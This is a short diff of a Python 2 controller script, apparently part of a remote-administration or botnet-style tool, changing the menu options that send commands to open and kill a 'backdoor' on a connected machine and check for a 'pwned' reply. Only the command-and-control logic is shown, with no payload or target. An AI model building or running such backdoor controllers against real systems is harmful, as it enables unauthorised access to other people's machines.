@@ -151,10 +151,6 @@ def main():
                 print addr
         elif choice == "5":
             try:
-                if bd_check == 'open':
-                    print "Backdoor already open"
-                    continue
-                bd_check = 'open'
                 conn.send("bd_me")
                 pwned = conn.recv(1024)
                 if pwned == "pwned":
@@ -168,6 +164,7 @@ def main():
                 bd_kill = conn.recv(1024)
                 if bd_kill == "bd_killed":
                     print "Backdoor killed."
+                    pwned = bd_kill
                     continue
             except:
                 print "Uh oh, can't kill backdoor!"
